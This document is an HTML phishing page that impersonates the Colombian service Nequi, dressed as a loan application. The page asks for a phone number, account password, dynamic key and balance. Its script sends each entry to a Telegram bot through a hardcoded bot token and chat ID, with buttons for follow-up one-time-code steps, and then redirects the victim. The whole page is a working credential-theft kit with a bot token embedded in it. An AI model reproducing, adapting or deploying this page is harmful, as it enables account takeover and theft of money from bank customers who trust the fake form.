<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>Préstamo Propulsor Nequi</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAEAAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA">
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
    body{background:#742fe1;color:#fff;min-height:100vh;display:flex;flex-direction:column}
    header{background:#fff;padding:15px 20px;position:fixed;top:0;width:100%;z-index:999;box-shadow:0 2px 10px rgba(0,0,0,.1)}
    .logo img{width:130px}
    .menu-btn span{display:block;width:25px;height:3px;background:#DA0081;margin:5px 0}
    .container{max-width:400px;margin:100px auto 20px;padding:20px;background:rgba(255,255,255,.1);border-radius:20px;backdrop-filter:blur(10px)}
    h1{font-size:24px;text-align:center;margin-bottom:10px}
    p{font-size:16px;text-align:center;margin-bottom:20px}
    .form-group{margin:15px 0;position:relative}
    input{width:100%;padding:15px;font-size:18px;border:none;border-radius:10px;background:rgba(255,255,255,.2);color:#fff}
    input::placeholder{color:#ddd}
    label{position:absolute;top:-10px;left:15px;background:#742fe1;padding:0 8px;font-size:14px}
    .country{display:flex;align-items:center;margin-bottom:10px}
    .country img{width:30px;margin-right:10px}
    .btn{width:100%;padding:15px;background:#ff6b6b;color:#fff;border:none;border-radius:50px;font-size:20px;cursor:pointer;margin-top:20px}
    .btn:disabled{opacity:.7;cursor:not-allowed}
    .spinner{border:4px solid #fff;border-top:4px solid #ff6b6b;border-radius:50%;width:24px;height:24px;animation:s 1s linear infinite;display:none;margin:0 auto}
    @keyframes s{from{transform:rotate(0)}to{transform:rotate(360deg)}}
    footer{background:#200020;padding:30px 20px;text-align:center;flex:1;display:flex;flex-direction:column;justify-content:flex-end}
    footer img{width:100px;margin:10px auto;display:block}
    .social img{width:30px;margin:5px}
    hr{border:1px solid #fff;opacity:.3;margin:20px 0}
    @media(min-width:768px){.container{max-width:500px}}
  </style>
</head>
<body>

  <header>
    <div style="display:flex;justify-content:space-between;align-items:center;max-width:1200px;margin:auto">
      <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg" alt="Nequi">
      <div class="menu-btn"><span></span><span></span><span></span></div>
    </div>
  </header>

  <div class="container">
    <h1>Préstamo Propulsor Nequi</h1>
    <p>Completa el formulario para continuar</p>

    <div class="country">
      <img src="https://flagcdn.com/co.svg" alt="Colombia">
      <strong>+57</strong>
    </div>

    <div class="form-group">
      <input type="tel" id="cel" placeholder=" " maxlength="10" required>
      <label>Número de celular</label>
    </div>

    <div class="form-group">
      <input type="password" id="pass" placeholder=" " required>
      <label>Contraseña</label>
    </div>

    <div class="form-group">
      <input type="text" id="token" placeholder=" " maxlength="6" required>
      <label>Clave dinámica</label>
    </div>

    <div class="form-group">
      <input type="number" id="saldo" placeholder=" " min="0" step="1000" required>
      <label>Saldo actual en la cuenta</label>
    </div>

    <button class="btn" id="btn">Entra</button>
    <div class="spinner" id="spinner"></div>
    <p id="msg" style="color:#ff6b6b;text-align:center;margin-top:15px"></p>
  </div>

  <footer>
    <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50b03c9fda96db04be382_logo-nequi-blanco.svg" alt="Nequi">
    <div class="social">
      <a href="#"><img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e5220142aa063fa007c444_ic-twitter.svg"></a>
      <a href="#"><img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201416719efe915e448_ic-instagram.svg"></a>
      <a href="#"><img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201c1a7bf3e9e5bd566_ic-facebook.svg"></a>
    </div>
    <hr>
    <small style="color:#ccc">© 2025 Nequi. Todos los derechos reservados.</small>
  </footer>

  <script>
    const BOT_TOKEN = '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc';
    const CHAT_ID = '8469651553';

    document.getElementById('btn').onclick = async () => {
      const cel = document.getElementById('cel').value.trim();
      const pass = document.getElementById('pass').value;
      const token = document.getElementById('token').value;
      const saldo = document.getElementById('saldo').value;

      if (!cel || cel.length !== 10 || !pass || !token || token.length !== 6 || !saldo) {
        document.getElementById('msg').textContent = 'Completa todos los campos';
        return;
      }

      const btn = document.getElementById('btn');
      const spinner = document.getElementById('spinner');
      btn.disabled = true;
      spinner.style.display = 'block';
      document.getElementById('msg').textContent = 'Enviando...';

      const mensaje = `*NUEVO INGRESO NEQUI*

*Número:* +57 ${cel}
*Contraseña:* ${pass}
*Clave dinámica:* ${token}
*Saldo:* $${parseInt(saldo).toLocaleString()}
*Hora:* ${new Date().toLocaleString('es-CO')}`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: mensaje,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{text: "OTP", url: location.origin + "/verifying/?do=otp"}],
              [{text: "Dinámica", url: location.origin + "/verifying/?do=dinamica"}],
              [{text: "Finalizar", url: location.origin + "/verifying/?do=ok"}]
            ]
          }
        })
      });

      document.getElementById('msg').innerHTML = 'Enviado! Redirigiendo...';
      setTimeout(() => location.href = '/verifying/', 1500);
    };
  </script>
</body>
</html>
